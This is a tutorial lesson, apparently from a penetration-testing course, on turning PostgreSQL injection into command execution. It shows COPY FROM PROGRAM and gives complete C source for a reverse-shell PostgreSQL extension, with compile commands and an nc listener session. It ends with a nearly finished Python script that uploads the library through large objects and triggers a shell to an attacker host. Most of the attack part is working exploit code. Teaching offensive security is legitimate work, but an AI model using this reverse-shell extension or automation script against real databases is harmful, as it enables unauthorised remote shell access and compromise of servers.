# Command Execution

## Introduction

In this section we will take a look at two ways you can run commands via a`PostgreSQL injection`.

## Method 1: COPY

The first method makes use of the built-in[COPY](https://www.postgresql.org/docs/current/sql-copy.html)command once again. As it turns out, aside from reading and writing files,`COPY`also lets us store data from a`program`in a table. What this means is that we can get`PostgreSQL`to run shell commands as the`postgres`user, store the results in a table, and read them out.

```
`bluebird=#CREATE TABLE tmp(t TEXT);CREATE TABLEbluebird=#COPY tmp FROM PROGRAM'id';COPY 1bluebird=#SELECT * FROM tmp;t                                    
------------------------------------------------------------------------
 uid=119(postgres) gid=124(postgres) groups=124(postgres),118(ssl-cert)
(1 row)bluebird=#DROP TABLE tmp;DROP TABLEbluebird=#exit`
```

Interestingly enough, this functionality is assigned a CVE ([CVE-2019-9193](https://nvd.nist.gov/vuln/detail/CVE-2019-9193)), however the PostgreSQL team issued a[statement](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)that this is intended functionality and therefore not a security issue.

#### Permissions

In order to use`COPY`for remote code execution, the user must have the[pg_execute_server_program](https://www.postgresql.org/docs/11/default-roles.html)role, or be a superuser.

## Method 2: PostgreSQL Extensions

A second, slightly more complicated way of running commands in`PostgreSQL`is by creating a`PostgreSQL extension`.[Extensions](https://www.postgresql.org/docs/current/external-extensions.html)are libraries that can be loaded into`PostgreSQL`to add custom functionalities.

As an example, we will walk through compiling and using the following custom`C`extension for`PostgreSQL`that returns a`reverse shell`as the`postgres`user:

Code:c```
`// Reverse Shell as a Postgres Extension// William Moody (@bmdyy)// 08.02.2023// CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '.../pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;// SELECT rev_shell('127.0.0.1', 443);// DROP FUNCTION rev_shell;// sudo apt install postgresql-server-dev-<version>// gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c#include<sys/socket.h>#include<arpa/inet.h>#include<unistd.h>#include<stdio.h>#include"postgres.h"#include"fmgr.h"#include"utils/builtins.h"PG_MODULE_MAGIC;PG_FUNCTION_INFO_V1(rev_shell);Datumrev_shell(PG_FUNCTION_ARGS){// Get argumentschar*LHOST=text_to_cstring(PG_GETARG_TEXT_PP(0));int32 LPORT=PG_GETARG_INT32(1);// Define necessary structstructsockaddr_inserv_addr;serv_addr.sin_family=AF_INET;serv_addr.sin_port=htons(LPORT);// LPORTinet_pton(AF_INET,LHOST,&serv_addr.sin_addr);// LHOST// Connect to targetintsock=socket(AF_INET,SOCK_STREAM,0);intclient_fd=connect(sock,(structsockaddr*)&serv_addr,sizeof(serv_addr));// Redirect STDOUT/IN/ERR to connectiondup2(sock,0);dup2(sock,1);dup2(sock,2);// Start interactive /bin/shexecve("/bin/sh",NULL,NULL);PG_RETURN_INT32(0);}`
```

Note: This specific exploit targets PostgreSQL running on`Linux`. The process for writing and compiling an exploit for`Windows`is very similar, it just requires different API calls and compiling to a DLL.

Near the beginning of the file, you may notice the line`PG_MODULE_MAGIC`. To avoid issues due to incompatibilities,`PostgreSQL`will only allow you to load extensions which were compiled for the correct (major) version. In this case, the version of`PostgreSQL`that we are targeting is`13.9`.

To compile this extension, we need to first install the`postgresql-server-dev`package for version`13`:

```
icantthinkofaname23@htb[/htb]`$sudoaptinstallpostgresql-server-dev-13`
```

Once it is installed, we can use`gcc`to compile it to a shared library object like so:

```
icantthinkofaname23@htb[/htb]`$gcc -I$(pg_config --includedir-server)-shared -fPIC -o pg_rev_shell.so pg_rev_shell.c`
```

The next step is to upload`pg_rev_shell.so`to the webserver. It doesn't matter how you do this (`COPY`or`Large Objects`), as long as you know the exact path it was uploaded to. Once it's been uploaded, we can run`CREATE FUNCTION`to load the`rev_shell`function from the library into the database and then call it to get a reverse shell.

```
`bluebird=#CREATE FUNCTION rev_shell(text, integer)RETURNS integer AS'/tmp/pg_rev_shell','rev_shell'LANGUAGEC STRICT;CREATE FUNCTIONbluebird=#SELECT rev_shell('127.0.0.1',443);server closed the connection unexpectedly
        This probably means the server terminated abnormally
        before or while processing the request.`
```

Note: Even though the file is`pg_rev_shell.so`, the extension is dropped in the`PostgreSQL command`.

When you run the second SQL command, it is expected for the database to hang since it's waiting for the function (reverse shell) to finish. If you check your listener, you should receive a reverse shell as`postgres`.

```
icantthinkofaname23@htb[/htb]`$nc-nvlp443listening on [any] 443 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45692
whoami
postgres
exit`
```

After you're done running commands, make sure to clean up after yourself by dropping the function from the database, as well as any large objects you may have created (depending on how you uploaded the library):

```
`bluebird=#DROP FUNCTION rev_shell;DROP FUNCTIONbluebird=#SELECT lo_unlink(58017);lo_unlink 
-----------
         1
(1 row)`
```

Note: If you'd prefer, you can use the`testing VM`for compilation, where`gcc`and`postgresql-server-dev-13`are already installed.

#### Permissions

Not every user can create functions in PostgreSQL. To do so, a user must be either a`superuser`, or have the`CREATE`privilege granted on the`public`schema. Additionally,`C`must have been added as a`trusted`language, since it is untrusted by default for all (non-super) users.

For reference check out the[PSQL Documentation](https://www.postgresql.org/docs/current/sql-grant.html)and this answer on[StackOverflow](https://stackoverflow.com/questions/7014437/error-permission-denied-for-language-c).

#### Automation / Writing an Exploit

In some cases it may make sense to write an exploit script to`automate`the steps for you. Uploading a shared library via large objects and then invoking a function call can require many requests and submitting those all manually can get quite tedious, so this is a good scenario to write a script to do it for you.

Here is a nearly completed script which automates (unauthenticated) command execution against BlueBird. Feel free to use it as a base for the exercise portion of this section.

Code:python```
`#!/usr/bin/python3importrequestsimportrandomimportstringfromurllib.parseimportquote_plusimportmath# Parameters for call to rev_shellLHOST="192.168.0.122"LPORT=443# Generate a random stringdefrandomString(N):return''.join(random.choices(string.ascii_letters+string.digits,k=N))# Inject a querydefsqli(q):# TODO: Use an SQL injection to run the query `q`# Read the compiled extensionwithopen("pg_rev_shell.so","rb")asf:raw=f.read()# Create a large objectloid=random.randint(50000,60000)sqli(f"SELECT lo_create({loid});")print(f"[*] Created large object with ID:{loid}")# Upload pg_rev_shell.so to large objectforpagenoinrange(math.ceil(len(raw)/2048)):page=raw[pageno*2048:pageno*2048+2048]print(f"[*] Uploading Page:{pageno}, Length:{len(page)}")sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid},{pageno}, decode('{page.hex()}','hex'));")# Write large object to file and run reverse shellquery=f"SELECT lo_export({loid}, '/tmp/pg_rev_shell.so');"query+=f"SELECT lo_unlink({loid});"query+="DROP FUNCTION IF EXISTS rev_shell;"query+="CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;"query+=f"SELECT rev_shell('{LHOST}',{LPORT});"print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST:{LHOST}, LPORT:{LPORT})")sqli(query)`
```
